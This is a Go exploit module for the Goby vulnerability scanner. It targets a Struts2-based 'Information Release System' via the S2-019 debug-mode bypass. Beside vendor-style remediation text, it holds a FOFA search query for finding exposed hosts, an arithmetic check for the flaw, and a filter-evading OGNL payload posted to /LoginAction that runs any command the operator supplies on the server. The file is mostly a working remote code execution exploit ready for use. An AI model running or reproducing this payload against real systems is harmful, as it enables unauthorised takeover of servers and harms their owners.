package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Information Release System St2-019 Debug bypass RCE",
    "Description": "The information release system uses the struts2 framework. The system has a struts2-019 vulnerability. By bypassing it, you can execute arbitrary commands to obtain server permissions.",
    "Impact": "Information Release System St2-019 Debug bypass RCE",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"http://zhsdmedia.com\">http://zhsdmedia.com</a></p><p> 1. Set access policies and whitelist access through security devices such as firewalls. 2. If it is not necessary, it is forbidden to access the system from the public network. </p>",
    "Product": "Information-Release-System",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "信息发布系统 St2-019 Debug 模式绕过命令执行漏洞",
            "Description": "<p>信息发布系统是一个多用户多媒体发布系统。</p><p>信息发布系统使用struts2框架。系统存在struts2-019漏洞。该系统存在命令执行绕过漏洞，攻击者可以执行任意命令以获得服务器权限。<p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://zhsdmedia.com\">http://zhsdmedia.com</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "信息发布系统",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Information Release System St2-019 Debug bypass RCE",
            "Description": "The information release system uses the struts2 framework. The system has a struts2-019 vulnerability. By bypassing it, you can execute arbitrary commands to obtain server permissions.",
            "Impact": "Information Release System St2-019 Debug bypass RCE",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"http://zhsdmedia.com\">http://zhsdmedia.com</a></p><p> 1. Set access policies and whitelist access through security devices such as firewalls. <br>2. If it is not necessary, it is forbidden to access the system from the public network. </p>",
            "Product": "Information-Release-System",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"<!--这是struts标签内容-->\"",
    "GobyQuery": "body=\"<!--这是struts标签内容-->\"",
    "Author": "go0p",
    "Homepage": "http://zhsdmedia.com",
    "DisclosureDate": "2021-07-30",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Information-Release-System"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	doPost := func(u *httpclient.FixUrl, payload string) string {
		cfg := httpclient.NewPostRequestConfig("/LoginAction")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8")
		cfg.Data = fmt.Sprintf("debug=command&expression=%s", payload)
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody
		} else {
			return ""
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			r1 := rand.Intn(7999999) + 150000
			r2 := rand.Intn(9999999) + 250000
			r3 := fmt.Sprintf("%d", r1+r2)
			check := url.QueryEscape(fmt.Sprintf("%d+%d", r1, r2))
			if resp := doPost(hostinfo, check); len(resp) > 0 && strings.Contains(resp, r3) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := stepLogs.Params["cmd"].(string)
			cmd = url.QueryEscape(fmt.Sprintf("(#U=#application['\\u006frg.apache.t\\u006fmcat.InstanceManager']).(#p=#U.newInstance('\\u006frg.apache.c\\u006fmm\\u006fns.c\\u006fllecti\\u006fns.\\u0042eanMap')).(#s=#attr['struts.valueStack']).(#p.set\\u0042ean(#s)).(#context=#p.get('c\\u006fntext')).(#p.set\\u0042ean(#c\\u006fntext)).(#sm=#p.get('m\\u0065mberAccess')).(#e=#U.n\\u0065wInstance('java.util.HashSet')).(#p.set\\u0042ean(#sm)).(#p.put('exclud\\u0065dClass\\u0065s',#e)).(#p.put('\\u0065xclud\\u0065dPackag\\u0065Names',#e)).(#c=#U.newInstance('fre\\u0065marker.t\\u0065mplat\\u0065.utility.Ex\\u0065cute')).(#cmd={'%s'}).(#c.ex\\u0065c(#cmd))", cmd))
			if resp := doPost(expResult.HostInfo, cmd); len(resp) > 0 {
				expResult.Success = true
				expResult.Output = resp
			}
			return expResult
		},
	))
}
